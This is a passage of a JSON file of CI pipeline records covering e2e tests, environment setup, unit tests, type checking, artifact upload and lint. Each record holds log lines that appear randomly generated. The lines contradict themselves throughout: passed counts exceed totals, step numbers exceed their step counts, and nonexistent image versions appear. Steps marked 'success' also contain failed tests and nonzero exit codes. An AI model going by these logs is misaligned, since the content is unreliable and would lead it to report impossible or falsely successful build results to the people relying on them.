          "Cache hit for key-8398",
          "WARNING: jest has known vulnerabilities",
          "Connection established",
          "[12:45:56] DEBUG: Query executed in 98ms",
          "Installing lodash@4.2.1",
          "yarn add: Done in 25.54s",
          "[12:45:56] INFO: Cache refreshed",
          "Snapshots: 19 passed, 29 total",
          "yarn add: Done in 2.92s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 11MB",
          "Waiting...",
          "Platform: darwin-arm64",
          "Test Suites: 39 passed, 29 total",
          "Platform: darwin-arm64",
          "Optimizing 77 modules...",
          "Fetching from https://docker.io/package.json",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] INFO: Connecting to database",
          "\u2713 Step 'build' succeeded",
          "Artifact downloaded: 37MB",
          "Uploading artifact 'build' (9 files)",
          "Cache hit for key-5180",
          "Cache hit for key-7979",
          "Image pulled successfully",
          "Step 2/20: Testing",
          "pip: Collecting lodash",
          "Platform: linux-x64",
          "Step 16/25: Testing",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'checkout' succeeded",
          "[12:45:56] WARN: Deprecated API usage",
          "Step 17/21: Installing dependencies",
          "npm install: added 16 packages",
          "Processing...",
          "Cache miss for key-3983",
          "Artifact uploaded: dist.zip (58MB)",
          "Success!",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Exception: TypeError",
          "TLS handshake completed",
          "[12:45:56] INFO: Request completed",
          "TLS handshake completed",
          "Layer 2/10: RUN command",
          "Verifying...",
          "npm install: added 315 packages",
          "\u2713 Task completed in 1338ms",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-29T12:46:22.180995",
        "finished_at": "2025-11-29T12:46:35.246706",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "WARNING: lodash has known vulnerabilities",
          "Layer 4/12: ENV command",
          "[12:45:56] INFO: Request completed",
          "Fetching from https://pypi.org/package.json",
          "yarn add: Done in 11.16s",
          "\u2713 Task completed in 3074ms",
          "pip: Collecting eslint",
          "Cache saved successfully",
          "[12:45:56] INFO: Cache refreshed",
          "Generating source maps...",
          "[12:45:56] INFO: Request completed",
          "Waiting...",
          "pip: Downloading react-1.2.tar.gz",
          "Ready.",
          "Step 17/21: Installing dependencies",
          "npm install: resolved 856 packages",
          "[12:45:56] INFO: Cache refreshed",
          "Step 18/15: Linting",
          "HEAD is now at c2f55d8",
          "OK",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "npm install: resolved 514 packages",
          "[12:45:56] INFO: Request completed",
          "[12:45:56] INFO: Processing request",
          "Done.",
          "[12:45:56] DEBUG: Loading configuration",
          "Time: 81.944s",
          "Cache miss for key-7752",
          "  PASS: integration/test_api_health.spec.js",
          "Loading...",
          "Coverage: 98% statements, 62% branches",
          "yarn add: Done in 2.62s",
          "NODE_ENV=test",
          "\u2713 Task completed in 2188ms",
          "Ready.",
          "Minifying app.js",
          "[12:45:56] DEBUG: Initializing service",
          "Image pulled successfully",
          "yarn add: Done in 26.38s",
          "Step 9/19: Testing",
          "Step 16/24: Building",
          "Pushing to registry...",
          "Compiling src/main.py...",
          "npm install: resolved 1234 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 394 packages",
          "Transforming 996 files...",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "  PASS: integration/test_cache_hit.spec.js",
          "npm install: added 270 packages",
          "npm notice: created a lockfile",
          "Coverage: 71% statements, 61% branches",
          "Checking out master branch",
          "npm install: added 81 packages",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Installing prettier@2.13.1",
          "Finished.",
          "Processing...",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (2MB)",
          "Transforming 381 files...",
          "[12:45:56] INFO: Request completed",
          "Creating production build...",
          "Step 18/19: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (488MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 14/17: Linting",
          "Compiling lib/handler.rs...",
          "Checking out master branch",
          "Artifact downloaded: 34MB",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] INFO: Cache refreshed",
          "POST /upload - 202 (177ms)",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 93ff915",
          "[12:45:56] DEBUG: Connection pool: 13 active",
          "Uploading artifact 'build' (26 files)",
          "Bundling runtime.js",
          "Connection established",
          "GET /health - 204 (94ms)",
          "Cache hit for key-8051",
          "Platform: darwin-arm64",
          "Loading...",
          "\u2713 Step 'install' succeeded",
          "Success!",
          "Compiling src/index.js...",
          "pip: Collecting express",
          "Transforming 884 files...",
          "Coverage: 98% statements, 60% branches",
          "Cache miss for key-4207",
          "\u2713 Step 'test' succeeded",
          "Fetching submodules...",
          "Step 5/15: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "Installing lodash@1.3.1",
          "[12:45:56] INFO: Connecting to database",
          "Processing...",
          "Layer 3/8: RUN command",
          "Generating source maps...",
          "Compiling lib/utils.go...",
          "FAILED: test_db_connect",
          "[12:45:56] INFO: Request completed",
          "Pulling image: node:3.11",
          "[12:45:56] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /api - 200 (22ms)",
          "FAILED: test_api_health",
          "[12:45:56] WARN: Deprecated API usage",
          "Loading...",
          "Completed.",
          "HEAD is now at 24b6e6c",
          "Connection established",
          "\u2713 Task completed in 1778ms",
          "\u2713 Task completed in 1545ms",
          "Environment: test",
          "Cache restored successfully (471MB)",
          "Pushing to registry...",
          "yarn add: Done in 7.93s",
          "Optimizing 59 modules...",
          "Compiling lib/utils.go...",
          "FAILED: test_auth_login",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] DEBUG: Memory usage: 226MB",
          "Step 8/21: Installing dependencies",
          "Step 16/23: Testing",
          "yarn add: Done in 13.25s",
          "TLS handshake completed",
          "Bundling styles.css",
          "HEAD is now at c3bf1cd",
          "Switched to branch 'feature/task-754'",
          "Using Node.js 18.2.9",
          "npm install: resolved 694 packages",
          "Step 5/22: Testing",
          "\u2713 All checks passed",
          "Uploading artifact 'coverage' (36 files)",
          "WARNING: eslint has known vulnerabilities",
          "Generating source maps...",
          "Fetching submodules...",
          "Step 4/16: Building",
          "\u2713 Task completed in 1888ms",
          "[12:45:56] INFO: Cache refreshed",
          "Layer 1/15: ENV command",
          "Cache saved successfully",
          "[12:45:56] WARN: Deprecated API usage",
          "[12:45:56] DEBUG: Connection pool: 12 active",
          "Cache saved successfully",
          "Checking out main branch",
          "[12:45:56] DEBUG: Memory usage: 1424MB",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-29T12:46:35.246706",
        "finished_at": "2025-11-29T12:46:48.312417",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u2713 test completed",
          "Ran 192 tests in 3s",
          "Pulling image: node:3.11",
          "HEAD is now at 1eae5f3",
          "WARNING: express has known vulnerabilities",
          "Bundling runtime.js",
          "Ready.",
          "[12:45:56] DEBUG: Initializing service",
          "Step 17/19: Deploying",
          "Minifying main.js",
          "[12:45:56] ERROR: Connection failed",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:56] ERROR: Connection failed",
          "Cache miss for key-7641",
          "Step 17/23: Linting",
          "Fetching submodules...",
          "Using Node.js 16.7.3",
          "[12:45:56] WARN: Deprecated API usage",
          "yarn add: Done in 17.82s",
          "[12:45:56] INFO: Cache refreshed",
          "pip install: Successfully installed prettier-1.1",
          "\u2713 Task completed in 246ms",
          "GET /health - 201 (90ms)",
          "\u2713 All checks passed",
          "npm install: resolved 189 packages",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Image pulled successfully",
          "Ready.",
          "[12:45:56] WARN: Deprecated API usage",
          "  PASS: unit/test_user_create.spec.js",
          "Ready.",
          "Cache restored successfully (192MB)",
          "Building Docker image...",
          "Exception: ValueError",
          "NODE_ENV=development",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] DEBUG: Connection pool: 11 active",
          "Test Suites: 47 passed, 19 total",
          "npm install: added 34 packages",
          "Cache hit for key-4996",
          "Artifact downloaded: 14MB",
          "Artifact uploaded: dist.zip (78MB)",
          "[12:45:56] WARN: Deprecated API usage",
          "[12:45:56] DEBUG: Initializing service",
          "Step 4/16: Building",
          "FAILED: test_user_create",
          "Completed.",
          "Cache invalidated: dependencies",
          "Step 2/21: Linting",
          "[12:45:56] INFO: Connecting to database",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: dist.zip (14MB)",
          "Step 16/22: Linting",
          "Layer 2/13: ENV command",
          "HEAD is now at 7260b70",
          "Fetching from https://pypi.org/package.json",
          "Installing lodash@4.6.8",
          "Finished.",
          "Pulling image: python:3.11",
          "Step 3/15: Installing dependencies",
          "Artifact downloaded: 36MB",
          "Ran 104 tests in 30s",
          "HEAD is now at 85eb8e1",
          "[12:45:56] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling lib/main.py...",
          "pip: Collecting lodash",
          "Connection established",
          "\u2713 Task completed in 1457ms",
          "Step 6/22: Installing dependencies",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 29MB",
          "Building Docker image...",
          "[12:45:56] DEBUG: Initializing service",
          "GET /status - 201 (21ms)",
          "\u2713 Step 'setup' succeeded",
          "npm notice: created a lockfile",
          "Creating production build...",
          "OK",
          "Success!",
          "Connection established",
          "\u2717 build failed with exit code 64",
          "Minifying vendor.js",
          "Cache miss for key-5554",
          "  PASS: e2e/test_auth_login.spec.js",
          "HEAD is now at 8179ea1",
          "Coverage: 84% statements, 86% branches",
          "[12:45:56] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (58MB)",
          "Image pulled successfully",
          "WARNING: axios has known vulnerabilities",
          "Compiling components/service.java...",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 28 passed, 16 total",
          "Ran 195 tests in 14s",
          "Loading...",
          "Artifact uploaded: dist.zip (68MB)",
          "POST /upload - 202 (442ms)",
          "npm notice: created a lockfile",
          "Environment: staging",
          "Step 6/18: Building",
          "OK",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 104",
          "POST /api - 201 (283ms)",
          "GET /status - 200 (67ms)",
          "[12:45:56] DEBUG: Loading configuration",
          "[12:45:56] INFO: Processing request",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 51",
          "FAILED: test_user_create",
          "Loading...",
          "Processing...",
          "POST /upload - 200 (427ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Layer 2/10: COPY command",
          "Using Python 3.11",
          "\u2717 build failed with exit code 18",
          "Step 3/19: Linting",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=development",
          "Fetching submodules...",
          "Ran 60 tests in 15s",
          "FAILED: test_db_connect",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "HEAD is now at f2907b3",
          "Cache saved successfully",
          "Step 5/20: Linting",
          "[12:45:56] INFO: Connecting to database",
          "pip install: Successfully installed jest-5.11",
          "Switched to branch 'hotfix/task-323'",
          "Success!",
          "Exception: RuntimeError",
          "GET /status - 204 (48ms)",
          "Ran 47 tests in 37s",
          "Artifact uploaded: dist.zip (50MB)",
          "Building Docker image...",
          "  PASS: unit/test_api_health.spec.js",
          "Processing...",
          "Loading...",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: e2e/test_api_health.spec.js",
          "\u2713 All checks passed",
          "Already up to date.",
          "\u2713 All checks passed",
          "[12:45:56] WARN: Deprecated API usage",
          "Environment: development",
          "WARNING: axios has known vulnerabilities",
          "[12:45:56] DEBUG: Memory usage: 507MB",
          "Minifying main.js",
          "Loading...",
          "Already up to date.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-29T12:46:48.312417",
        "finished_at": "2025-11-29T12:47:27.509549",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Checking out main branch",
          "Installing express@2.16.4",
          "npm install: added 83 packages",
          "Step 13/22: Linting",
          "pip: Installing build dependencies...",
          "Success!",
          "Pulling image: node:18",
          "Artifact uploaded: dist.zip (1MB)",
          "[12:45:56] INFO: Processing request",
          "Cache hit for key-7658",
          "Checking out master branch",
          "Cache miss for key-1150",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache saved successfully",
          "Completed.",
          "Verifying...",
          "OK",
          "Tests: 326 passed, 242 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/25: Running migrations",
          "Time: 34.244s",
          "Waiting...",
          "Exception: NullPointerException",
          "Step 17/22: Linting",
          "Loading...",
          "Cache restored successfully (285MB)",
          "Artifact uploaded: dist.zip (32MB)",
          "pip: Collecting axios",
          "Ready.",
          "Checking out master branch",
          "\u2717 build failed with exit code 88",
          "Ran 134 tests in 39s",
          "yarn add: Done in 15.35s",
          "\u2713 Task completed in 284ms",
          "Creating production build...",
          "Artifact uploaded: dist.zip (14MB)",
          "Compiling utils/service.java...",
          "POST /api - 200 (36ms)",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting jest",
          "Connection established",
          "POST /upload - 200 (124ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 16/17: Linting",
          "[12:45:56] WARN: Deprecated API usage",
          "Building Docker image...",
          "Image pulled successfully",
          "\u2713 Step 'build' succeeded",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] INFO: Starting build process",
          "npm notice: created a lockfile",
          "POST /data - 200 (248ms)",
          "Creating production build...",
          "Test Suites: 44 passed, 35 total",
          "OK",
          "  PASS: test_db_connect (250ms)",
          "[12:45:56] ERROR: Connection failed",
          "TLS handshake completed",
          "Tests: 68 passed, 380 total",
          "Ready.",
          "Minifying app.js",
          "Fetching from https://googleapis.com/package.json",
          "Using Node.js 14.0.4",
          "Completed.",
          "Fetching from https://googleapis.com/package.json",
          "FAILED: test_db_connect",
          "Completed.",
          "Generating source maps...",
          "POST /upload - 202 (403ms)",
          "Cache invalidated: node_modules",
          "Connection established",
          "Layer 9/15: ENV command",
          "yarn add: Done in 18.65s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 12/25: Linting",
          "Creating production build...",
          "npm notice: package.json updated",
          "[12:45:56] INFO: Connecting to database",
          "Snapshots: 34 passed, 50 total",
          "Using Node.js 20.6.6",
          "NODE_ENV=test",
          "Success!",
          "Verifying...",
          "[12:45:56] DEBUG: Initializing service",
          "\u2713 lint completed",
          "Artifact downloaded: 34MB",
          "[12:45:56] INFO: Starting build process",
          "NODE_ENV=test",
          "Transforming 299 files...",
          "HEAD is now at e68c9b6",
          "Already up to date.",
          "Cache restored successfully (161MB)",
          "npm install: added 174 packages",
          "\u2713 All checks passed",
          "Loading...",
          "[12:45:56] INFO: Connecting to database",
          "[12:45:56] INFO: Starting build process",
          "Fetching from https://amazonaws.com/package.json",
          "Artifact uploaded: dist.zip (11MB)",
          "pip install: Successfully installed webpack-2.9",
          "Creating production build...",
          "[12:45:56] INFO: Connecting to database",
          "[12:45:56] ERROR: Connection failed",
          "Tests: 363 passed, 187 total",
          "[12:45:56] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 2971ms",
          "Bundling runtime.css",
          "[12:45:56] DEBUG: Query executed in 63ms",
          "Completed.",
          "Fetching from https://gcr.io/package.json",
          "Compiling src/handler.rs...",
          "Success!",
          "Using Node.js 18.17.2",
          "[12:45:56] INFO: Processing request",
          "\u2717 build failed with exit code 56",
          "[12:45:56] INFO: Request completed",
          "Connection established",
          "Compiling lib/handler.rs...",
          "[12:45:56] DEBUG: Connection pool: 11 active",
          "Compiling src/utils.go...",
          "TLS handshake completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Completed.",
          "[12:45:56] INFO: Request completed",
          "Uploading artifact 'build' (18 files)",
          "Ready.",
          "Installing lodash@4.13.8",
          "Step 19/23: Deploying",
          "Building Docker image...",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling src/service.java...",
          "Step 14/17: Running migrations",
          "Artifact uploaded: dist.zip (100MB)",
          "POST /api - 202 (494ms)",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "  PASS: test_cache_hit (168ms)",
          "Minifying vendor.js",
          "  PASS: e2e/test_user_create.spec.js",
          "Creating production build...",
          "  PASS: test_user_create (429ms)",
          "Compiling lib/service.java...",
          "Cache invalidated: dependencies",
          "[12:45:56] INFO: Connecting to database",
          "[12:45:56] DEBUG: Memory usage: 597MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 45 modules...",
          "Pulling image: python:latest",
          "Step 17/25: Linting",
          "Exception: RuntimeError",
          "Compiling components/index.js...",
          "FAILED: test_api_health",
          "Generating source maps...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-29T12:47:27.509549",
        "finished_at": "2025-11-29T12:47:40.575260",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (89MB)",
          "pip: Installing build dependencies...",
          "Ran 200 tests in 16s",
          "pip: Collecting axios",
          "[12:45:56] DEBUG: Query executed in 84ms",
          "\u2713 lint completed",
          "Step 6/24: Installing dependencies",
          "FAILED: test_auth_login",
          "Cache miss for key-3465",
          "Generating source maps...",
          "[12:45:56] INFO: Processing request",
          "Switched to branch 'hotfix/task-865'",
          "  PASS: integration/test_user_create.spec.js",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Task completed in 293ms",
          "pip install: Successfully installed express-3.10",
          "\u2713 All checks passed",
          "[12:45:56] DEBUG: Initializing service",
          "Step 10/15: Building",
          "[12:45:56] WARN: Deprecated API usage",
          "Waiting...",
          "Step 20/21: Building",
          "[12:45:56] DEBUG: Initializing service",
          "Compiling components/main.py...",
          "Ready.",
          "NODE_ENV=production",
          "Uploading artifact 'build' (33 files)",
          "[12:45:56] INFO: Request completed",
          "[12:45:56] DEBUG: Loading configuration",
          "POST /api - 201 (475ms)",
          "Step 12/21: Deploying",
          "OK",
          "Completed.",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Installing axios@5.10.3",
          "[12:45:56] DEBUG: Connection pool: 16 active",
          "Verifying...",
          "Transforming 469 files...",
          "Ready.",
          "pip install: Successfully installed react-3.11",
          "NODE_ENV=development",
          "npm install: resolved 879 packages",
          "Optimizing 18 modules...",
          "NODE_ENV=production",
          "Step 2/23: Testing",
          "NODE_ENV=development",
          "GET /health - 200 (21ms)",
          "[12:45:56] DEBUG: Initializing service",
          "Time: 93.485s",
          "Exception: RuntimeError",
          "[12:45:56] DEBUG: Connection pool: 17 active",
          "Success!",
          "Step 20/24: Running migrations",
          "pip: Downloading express-1.19.tar.gz",
          "[12:45:56] INFO: Processing request",
          "Step 11/18: Linting",
          "[12:45:56] DEBUG: Loading configuration",
          "  PASS: test_api_health (271ms)",
          "pip: Installing build dependencies...",
          "Optimizing 36 modules...",
          "pip: Collecting eslint",
          "[12:45:56] INFO: Starting build process",
          "\u2713 Task completed in 1969ms",
          "Compiling src/handler.rs...",
          "[12:45:56] DEBUG: Connection pool: 11 active",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Done.",
          "[12:45:56] WARN: Deprecated API usage",
          "Snapshots: 34 passed, 40 total",
          "Pushing to registry...",
          "[12:45:56] DEBUG: Memory usage: 1311MB",
          "npm install: resolved 690 packages",
          "Artifact uploaded: dist.zip (4MB)",
          "Using Python 3.11",
          "Ready.",
          "[12:45:56] INFO: Request completed",
          "Compiling utils/app.ts...",
          "Platform: win32-x64",
          "Step 17/15: Testing",
          "Cache saved successfully",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "Uploading artifact 'build' (15 files)",
          "npm notice: created a lockfile",
          "[12:45:56] INFO: Starting build process",
          "Waiting...",
          "pip: Collecting lodash",
          "[12:45:56] INFO: Request completed",
          "Ready.",
          "Using Node.js 19.0.5",
          "\u2717 build failed with exit code 62",
          "Finished.",
          "Cache invalidated: build",
          "Coverage: 80% statements, 66% branches",
          "Cache hit for key-4006",
          "Tests: 329 passed, 250 total",
          "Finished.",
          "Compiling utils/service.java...",
          "[12:45:56] INFO: Request completed",
          "Cache invalidated: node_modules",
          "NODE_ENV=production",
          "Step 2/23: Testing",
          "[12:45:56] INFO: Cache refreshed",
          "Using Python 3.11",
          "Loading...",
          "Done.",
          "Fetching submodules...",
          "NODE_ENV=test",
          "Minifying main.js",
          "Cache restored successfully (408MB)",
          "Platform: linux-x64",
          "Cache restored successfully (104MB)",
          "TLS handshake completed",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting webpack",
          "Compiling lib/service.java...",
          "Compiling components/main.py...",
          "pip install: Successfully installed prettier-1.7",
          "Finished.",
          "NODE_ENV=test",
          "Verifying...",
          "Step 20/25: Linting",
          "pip: Collecting prettier",
          "\u2713 Step 'setup' succeeded",
          "[12:45:56] DEBUG: Memory usage: 1429MB",
          "Waiting...",
          "Artifact uploaded: dist.zip (42MB)",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out master branch",
          "POST /api - 201 (265ms)",
          "GET /status - 204 (91ms)",
          "npm notice: package.json updated",
          "\u2713 Step 'setup' succeeded",
          "Pulling image: alpine:latest",
          "Fetching from https://npmjs.org/package.json",
          "Building Docker image...",
          "Minifying main.js",
          "Installing eslint@3.5.5",
          "[12:45:56] DEBUG: Connection pool: 14 active",
          "npm notice: package.json updated",
          "Using Node.js 16.20.7",
          "Cache hit for key-8407",
          "Step 19/23: Installing dependencies",
          "npm notice: created a lockfile",
          "Success!",
          "[12:45:56] WARN: Deprecated API usage",
          "Installing prettier@1.8.4",
          "HEAD is now at 672526c",
          "\u2713 Task completed in 4566ms",
          "Image pulled successfully",
          "Success!",
          "[12:45:56] INFO: Processing request",
          "Installing express@5.1.8",
          "Ran 73 tests in 35s",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-29T12:47:40.575260",
        "finished_at": "2025-11-29T12:47:53.640971",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:45:56] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@5.6.8",
          "Already up to date.",
          "Generating source maps...",
          "NODE_ENV=development",
          "Artifact downloaded: 5MB",
          "pip: Collecting eslint",
          "Processing...",
          "Installing express@3.6.0",
          "Cache saved successfully",
          "Step 2/18: Linting",
          "Bundling main.css",
          "Step 17/19: Deploying",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:56] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://registry.npmjs.org/package.json",
          "Step 17/18: Running migrations",
          "Cache miss for key-5459",
          "Cache miss for key-4435",
          "Finished.",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "Step 7/22: Building",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: dist.zip (71MB)",
          "Processing...",
          "Ran 108 tests in 14s",
          "\u2717 build failed with exit code 29",
          "[12:45:56] DEBUG: Query executed in 83ms",
          "  PASS: integration/test_user_create.spec.js",
          "Uploading artifact 'coverage' (6 files)",
          "Ran 180 tests in 52s",
          "\u2713 Step 'checkout' succeeded",
          "Cache saved successfully",
          "Loading...",
          "Compiling src/utils.go...",
          "npm install: resolved 960 packages",
          "Step 15/25: Deploying",
          "[12:45:56] INFO: Connecting to database",
          "Step 4/17: Running migrations",
          "[12:45:56] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (320ms)",
          "Exception: ValueError",
          "OK",
          "Cache saved successfully",
          "npm install: resolved 1775 packages",
          "Connection established",
          "Pushing to registry...",
          "pip: Collecting react",
          "Artifact uploaded: dist.zip (20MB)",
          "Connection established",
          "Cache hit for key-3999",
          "Processing...",
          "pip: Installing build dependencies...",
          "Tests: 460 passed, 324 total",
          "[12:45:56] DEBUG: Loading configuration",
          "Finished.",
          "Time: 24.620s",
          "Step 10/22: Building",
          "Already up to date.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 2/18: Running migrations",
          "pip install: Successfully installed axios-1.4",
          "GET /health - 201 (8ms)",
          "Step 9/17: Testing",
          "NODE_ENV=production",
          "Waiting...",
          "Step 4/16: Testing",
          "Pushing to registry...",
          "\u2713 Task completed in 3722ms",
          "Minifying main.js",
          "yarn add: Done in 5.46s",
          "NODE_ENV=development",
          "[12:45:56] INFO: Starting build process",
          "  PASS: test_db_connect (345ms)",
          "NODE_ENV=production",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:56] WARN: Deprecated API usage",
          "[12:45:56] INFO: Cache refreshed",
          "Verifying...",
          "Connection established",
          "Success!",
          "[12:45:56] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Installing eslint@1.14.3",
          "[12:45:56] INFO: Cache refreshed",
          "Step 2/24: Linting",
          "pip: Collecting jest",
          "HEAD is now at e50312e",
          "Environment: development",
          "HEAD is now at 5dec56c",
          "Step 5/21: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.9",
          "Fetching submodules...",
          "Coverage: 95% statements, 83% branches",
          "[12:45:56] INFO: Connecting to database",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Environment: test",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=test",
          "Done.",
          "Already up to date.",
          "Checking out main branch",
          "npm install: resolved 1566 packages",
          "POST /data - 202 (325ms)",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "Transforming 977 files...",
          "Cache invalidated: dependencies",
          "yarn add: Done in 3.52s",
          "Switched to branch 'feature/task-371'",
          "[12:45:56] DEBUG: Loading configuration",
          "[12:45:56] DEBUG: Query executed in 91ms",
          "  PASS: integration/test_cache_hit.spec.js",
          "Layer 7/11: COPY command",
          "Compiling lib/main.py...",
          "npm install: added 153 packages",
          "Bundling styles.css",
          "\u2713 Task completed in 2832ms",
          "\u2713 test completed",
          "Compiling utils/service.java...",
          "Layer 7/15: RUN command",
          "Step 3/23: Deploying",
          "Minifying app.js",
          "Platform: linux-x64",
          "\u2713 Step 'setup' succeeded",
          "[12:45:56] ERROR: Connection failed",
          "[12:45:56] DEBUG: Initializing service",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: staging",
          "Test Suites: 39 passed, 8 total",
          "[12:45:56] DEBUG: Memory usage: 1345MB",
          "[12:45:56] DEBUG: Memory usage: 1904MB",
          "Checking out master branch",
          "Time: 38.135s",
          "Verifying...",
          "WARNING: lodash has known vulnerabilities",
          "GET /health - 201 (98ms)",
          "TLS handshake completed",
          "Checking out develop branch",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "Generating source maps...",
          "Step 10/19: Linting",
          "[12:45:56] ERROR: Connection failed",
          "Installing jest@5.1.9",
          "Verifying...",
          "Optimizing 60 modules...",
          "Fetching submodules...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-29T12:47:53.640971",
        "finished_at": "2025-11-29T12:48:06.706682",
        "log_lines": [
          "=== Step: lint ===",
          "Test Suites: 6 passed, 47 total",
          "npm install: added 83 packages",
          "Finished.",
          "pip: Collecting eslint",
          "Step 6/17: Deploying",
          "Cache restored successfully (115MB)",
          "Snapshots: 7 passed, 46 total",
          "POST /api - 201 (299ms)",
          "\u2713 All checks passed",
          "yarn add: Done in 17.38s",
          "Snapshots: 3 passed, 33 total",
          "npm install: added 293 packages",
          "[12:45:56] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:56] INFO: Connecting to database",
          "Creating production build...",
          "Step 13/20: Building",
          "Checking out master branch",
          "Step 19/19: Deploying",
          "yarn add: Done in 10.0s",
          "Already up to date.",
          "Success!",
          "npm install: resolved 1010 packages",
          "Using Node.js 17.3.8",
          "Fetching from https://gcr.io/package.json",
          "Processing...",
          "[12:45:56] WARN: Deprecated API usage",
          "Finished.",
          "Cache hit for key-4827",
          "Compiling lib/main.py...",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "TLS handshake completed",
          "Layer 5/12: ENV command",
          "[12:45:56] WARN: Deprecated API usage",
          "Success!",
          "Done.",
          "Platform: linux-x64",
          "Verifying...",
          "Finished.",
          "Layer 1/14: RUN command",
          "Ran 50 tests in 16s",
          "OK",
          "Installing webpack@1.11.6",
          "HEAD is now at 49aec16",
          "Checking out master branch",
